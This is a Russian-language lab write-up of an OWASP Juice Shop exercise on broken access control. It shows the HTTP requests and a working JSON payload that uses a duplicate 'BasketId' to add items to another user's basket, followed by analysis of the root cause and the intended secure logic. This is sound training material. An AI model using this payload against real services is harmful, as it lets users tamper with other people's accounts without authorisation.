# A01:2025 - Broken Access Control

## Case 01: Manipulate Another User's Basket

### Краткая информация

- **Приложение:** OWASP Juice Shop
- **Категория:** A01:2025 - Broken Access Control
- **Тип:** Horizontal Privilege Escalation
- **Связанный термин:** IDOR / BOLA
- **Состояние аутентификации:** атакующий авторизован как обычный пользователь
- **Результат:** изменение корзины другого пользователя
- **Среда:** локальный авторизованный учебный стенд

---

## 1. Описание

Broken Access Control возникает, когда приложение неправильно проверяет,
имеет ли текущий пользователь право выполнять определённую операцию над
конкретным объектом.

В данном кейсе обычный авторизованный пользователь пытается добавить товар
в корзину другого пользователя. Для эксплуатации используется HTTP Parameter
Pollution: в одном JSON-запросе передаются два значения параметра `BasketId`.

Проверка приложения принимает идентификатор собственной корзины атакующего,
однако последующая логика обработки использует идентификатор чужой корзины.

В результате пользователь `attacker` может добавить товар в корзину пользователя
`deffer`, не имея его токена или учётных данных.

---

## 2. Участники теста

| Роль | Учётная запись | UserId | BasketId | Назначение |
|---|---|---:|---:|---|
| Атакующий | `attacker` | `25` | `7` | Отправляет изменённый запрос |
| Жертва | `deffer` | `26` | `6` | Владеет целевой корзиной |

Все действия выполняются только в локальном экземпляре OWASP Juice Shop.

---

## 3. Лабораторная среда

Приложение запущено локально с помощью Docker:

```bash
docker run --rm -p 3000:3000 bkimminich/juice-shop
```

---

## 4. Разведка

### 4.1. Корзина пользователя `deffer`

1. Выполнен вход под учётной записью `deffer`.
2. В корзину добавлен товар.
3. Во вкладке **Network** проанализированы связанные HTTP-запросы.
4. В одном из запросов обнаружен идентификатор корзины:

```json
{
  "BasketId": 6
  "UserId": 26
}
```

Связь значения `[6]` с корзиной пользователя `deffer` подтверждается следующими наблюдениями:
1. Запрос был выполнен в активной сесси пользователя `deffer`.
2. Запрос содержит UserId: 26.
3. В ответе содержится добавленный пользователем `deffer` товар.

Таким образом, на этапе разведки установлено следующее соответствие:

```text
User: deffer
UserId: 26
BasketId: 6
```

Само по себе обнаружение идентификатора корзины еще не доказывает наличие
Broken Access Control. Для этого необходимо проверить, сможет ли другой
авторизованный пользователь выполнить операцию над этой корзиной.

### 4.2. Идентификация корзины пользователя `attacker`

В корзину атакующего был добавлен тестовый товар. После в сетевых запросах были обнаружены следующие значения:

```json
{
  "UserId": 25,
  "BasketId": 7
}
```

Итоговое состояние перед проверкой:

| Пользователь | UserId | BasketId |
|---|---:|---:|
| `deffer` | `26` | `6` |
| `attacker` | `25` | `7` |

---

## 6. Анализ штатного запроса

### 6.1. Штатный запрос пользователя `attacker`

Пользователь `attacker` добавил товар в собственную корзину. В DevTools был найден запрос:
```http
POST /api/BasketItems/ HTTP/1.1
Host: localhost:3000
Authorization: Bearer [REDACTED]
Content-Type: application/json
```

Тело штатного запроса:

```json
{
  "ProductId": [24],
  "BasketId": "7",
  "quantity": 2
}
```
Запрос был выполнен без изменений, чтобы подтвердить, что товар добавляется в корзину пользователя `attacker`.

---

## 7. Проверка прямого доступа к чужой корзине

### 7.1. Прямая попытка обратиться к чужой корзине

Сначала была выполнена стандартная проверка: в штатном запросе пользователя `attacker` значение собственной корзины `BasketId: 7` было заменено на `BasketId: 6`, принадлежащее пользователю `deffer`.

Запрос отправлялся с действительным токеном пользователя `attacker`
(`UserId: 25`). Токен пользователя `deffer` не использовался.

```http
POST /api/BasketItems HTTP/1.1
Host: localhost:3000
Authorization: Bearer [REDACTED]
Content-Type: application/json
```

```json
{
  "ProductId": 51,
  "BasketId": "6",
  "quantity": 1
}
```

Сопоставление объектов:

| Параметр | Значение |
|---|---|
| Пользователь запроса | `attacker` |
| UserId пользователя запроса | `25` |
| Целевая корзина | `BasketId: 6` |
| Владелец целевой корзины | `deffer` |
| UserId владельца | `26` |
| ProductId | `51` |

Сервер отклонил запрос и вернул:

```text
{'error' : 'Invalid BasketId'}
```

Таким образом, прямая попытка использовать `BasketId: 6` была заблокирована. Этот результат является промежуточным этапом проверки и показывает, что обычная подмена идентификатора корзины не приводит к успешному выполнению операции.

Для получения окончательного результата далее проверяется обработка нескольких значений одного параметра `BasketId` в одном запросе.

### 7.2. Эксплуатация через HTTP Parameter Pollution

После того как прямая подмена `BasketId: 7` на `BasketId: 6` была отклонена ошибкой `Invalid BasketId`, была проверена обработка повторяющихся параметров.

В тело запроса были добавлены два значения `BasketId`:

```json
{
  "ProductId": 24,
  "BasketId": "7",
  "quantity": 1,
  "BasketId": "6"
}
```

Значения параметра соответствуют следующим корзинам:

| Значение | Владелец |
|---|---|
| `BasketId: 7` | `attacker`, `UserId: 25` |
| `BasketId: 6` | `deffer`, `UserId: 26` |

Запрос был отправлен с действительным токеном пользователя `attacker`.
Токен и cookies пользователя `deffer` не использовались.

Полный запрос:

```http
POST /api/BasketItems HTTP/1.1
Host: localhost:3000
Authorization: Bearer [REDACTED]
Content-Type: application/json
```

```json
{
  "ProductId": 24,
  "BasketId": "7",
  "quantity": 1,
  "BasketId": "6"
}
```

### 7.3. Результат эксплуатации

Запрос был принят приложением. После этого была выполнена проверка корзины
пользователя `deffer`.

Для проверки результата:

1. Выполнен выход из учётной записи `attacker`.
2. Выполнен вход под учётной записью `deffer`.
3. Открыта корзина пользователя `deffer`.
4. Страница корзины обновлена.
5. Проверено содержимое корзины.

В результате в корзине пользователя `deffer` появились товары, которые не добавлялись из его учётной записи. Это подтверждает горизонтальное нарушение контроля доступа.

## 8. Механика уязвимости

Приложение некорректно обрабатывает повторяющиеся значения параметра
`BasketId`.

Упрощённо атака выглядит следующим образом:

```text
BasketId = 7 -> проходит проверку как корзина текущего пользователя
BasketId = 6 -> используется при выполнении операции
```

В результате проверка и фактическое изменение корзины выполняются для разных значений одного логического параметра.

Проблема заключается не в том, что идентификатор `6` является секретным.
Проблема заключается в том, что сервер не обеспечивает однозначную обработку параметра и не проверяет владельца корзины непосредственно перед изменением.

Ожидаемое безопасное поведение:

```text
1. Получить ровно одно значение BasketId.
2. Определить текущего пользователя по проверенной сессии.
3. Найти корзину только при совпадении BasketId и UserId.
4. Выполнить операцию над найденной и проверенной корзиной.
```

Фактическое поведение уязвимого приложения позволяет разделить этап проверки и этап выполнения между разными значениями `BasketId`.

## 9. Корневая причина

Корневая причина состоит из двух связанных ошибок:

1. сервер не выполняет надёжную проверку принадлежности корзины текущему
   пользователю;
2. сервер допускает неоднозначную обработку повторяющихся значений `BasketId`.

Уязвимая логика может быть представлена так:

```text
1. Получить значения BasketId из запроса.
2. Использовать одно значение для проверки.
3. Использовать другое значение при выполнении операции.
4. Не проверить владельца целевой корзины непосредственно перед изменением.
```

Сервер должен использовать одно нормализованное значение `BasketId` для всех этапов обработки и проверять владельца объекта по данным текущей сессии.
